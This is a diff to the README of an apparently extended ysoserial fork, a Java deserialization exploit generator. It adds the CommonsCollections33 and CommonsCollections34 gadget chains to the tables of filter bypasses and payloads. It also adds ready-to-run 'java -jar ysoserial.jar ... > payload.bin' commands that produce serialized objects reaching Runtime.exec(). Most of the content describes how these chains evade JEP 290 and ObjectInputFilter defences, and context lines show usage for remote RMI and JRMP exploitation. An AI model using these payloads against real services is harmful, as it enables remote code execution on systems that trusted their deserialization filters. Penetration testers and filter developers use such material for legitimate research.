@@ -25,6 +25,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `DefaultedMap` | CC30 ‡ | LazyMap sibling decorator — same pattern, different class name |
 | `TransformedMap` | CC31 ‡ | Original CC1 paper root — dropped from ysoserial, forgotten by filters |
 | `ListOrderedMap` | CC32 ‡ | Insertion-order decorator — readObject calls put() → hashCode |
+| `DualLinkedHashBidiMap` | CC34 ‡ | CC4 BidiMap with LinkedHashMap internals — cross-library (CC4 entry + CC3 tail) |
 | `HashBag` | CC24 ‡ | Bag type entry — not Map/Set/Queue, completely novel class family |
 | `CaseInsensitiveMap` | CC26 ‡ | **toString dispatch** — novel mechanism, not hashCode/compare |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
@@ -45,6 +46,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 | `CC17` ‡ | PriorityBlockingQueue + `InstantiateTransformer` | PQ filter bypass + sink bypass |
 | `ROME5` ‡ | PBQ + `StringValueTransformer` → ROME `ToStringBean` | Novel transformer — never in any filter list |
 | `CC13` † | Cross-library CC4→CC3 + InvokerTransformer | Version-specific filters miss cross-library |
+| `CC33` ‡ | `SwitchTransformer` wrapping `ChainedTransformer` | LazyMap.factory = SwitchTransformer — paired filter checks miss ChainedTransformer |
 
 ### JDK 17+ Compatible (No TemplatesImpl)
 
@@ -94,6 +96,8 @@ Discovered via **IOCD static analysis** (bytecode scanning for source→link→s
 | `CB7` ‡ | `DualTreeBidiMap` | compare | BeanComparator → `TemplatesImpl` | CB |
 | `CBJndi5` ‡ | `DualTreeBidiMap` | compare | BeanComparator → JNDI | CB |
 | `CCJndi3` ‡ | `DualHashBidiMap` | hashCode | ChainedTransformer → `doLookup()` | CC3 |
+| `CC33` ‡ | `DualHashBidiMap` | hashCode | **SwitchTransformer** → ChainedTransformer → `Runtime.exec()` | CC3 |
+| `CC34` ‡ | `DualLinkedHashBidiMap` | hashCode | InvokerTransformer → `Runtime.exec()` | CC4+CC3 |
 
 Each entry represents a distinct **class family** or **dispatch mechanism** — redundant CC3/CC4 mirror variants removed.
 
@@ -172,6 +176,8 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsCollections16` | @dmbs335 ‡ | ConcurrentSkipListMap + InstantiateTransformer — novel entry point, 5x filter bypass |
 | `CommonsCollections18`/`21`/`24`/`26` | @dmbs335 ‡ | IOCD-discovered — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
 | `CommonsCollections28`–`32` | @dmbs335 ‡ | Fuzzer-discovered alt roots (HashedMap/LRUMap/DefaultedMap/TransformedMap/ListOrderedMap) — see [IOCD section](#iocd-discovered-chains-static-analysis--fuzzer) |
+| `CommonsCollections33` | @dmbs335 ‡ | SwitchTransformer wrapping ChainedTransformer — LazyMap.factory bypass |
+| `CommonsCollections34` | @dmbs335 ‡ | DualLinkedHashBidiMap (CC4) cross-library entry — 182 fuzzer findings |
 | `CommonsBeanutils5` | @dmbs335 ‡ | ConcurrentSkipListMap + BeanComparator — no CC dependency on target |
 | `CommonsBeanutils7` | @dmbs335 ‡ | DualTreeBidiMap + BeanComparator → TemplatesImpl — BidiMap entry |
 | `CommonsBeanutilsJndi3` | @dmbs335 ‡ | ConcurrentSkipListMap + JNDI — JDK 17+ friendly, no CC, no TemplatesImpl |
@@ -204,7 +210,7 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
 | `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |
 
-## All Payloads (103 total)
+## All Payloads (105 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -259,6 +265,8 @@ CommonsCollections29   @dmbs335 ‡                             commons-collecti
 CommonsCollections30   @dmbs335 ‡                             commons-collections:3.1
 CommonsCollections31   @dmbs335 ‡                             commons-collections:3.1
 CommonsCollections32   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections33   @dmbs335 ‡                             commons-collections:3.1
+CommonsCollections34   @dmbs335 ‡                             commons-collections:3.1, commons-collections4:4.0
 CommonsCollectionsJndi @mbechler                              commons-collections:3.1
 CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
 CommonsCollectionsDNS  @dmbs335 ‡                             commons-collections:3.1
@@ -398,6 +406,12 @@ java -jar ysoserial.jar CommonsCollections29 'calc.exe' > payload.bin  # LRUMap 
 java -jar ysoserial.jar CommonsCollections30 'calc.exe' > payload.bin  # DefaultedMap
 java -jar ysoserial.jar CommonsCollections31 'calc.exe' > payload.bin  # TransformedMap (OG CC1 root)
 java -jar ysoserial.jar CommonsCollections32 'calc.exe' > payload.bin  # ListOrderedMap
+
+# SwitchTransformer bypass: ChainedTransformer hidden inside SwitchTransformer
+java -jar ysoserial.jar CommonsCollections33 'calc.exe' > payload.bin
+
+# DualLinkedHashBidiMap (CC4): cross-library entry (CC4) + gadgets (CC3)
+java -jar ysoserial.jar CommonsCollections34 'calc.exe' > payload.bin
 
 # IOCD-discovered: toString dispatch via CaseInsensitiveMap (novel mechanism)
 java -jar ysoserial.jar CommonsCollections26 'calc.exe' > payload.bin
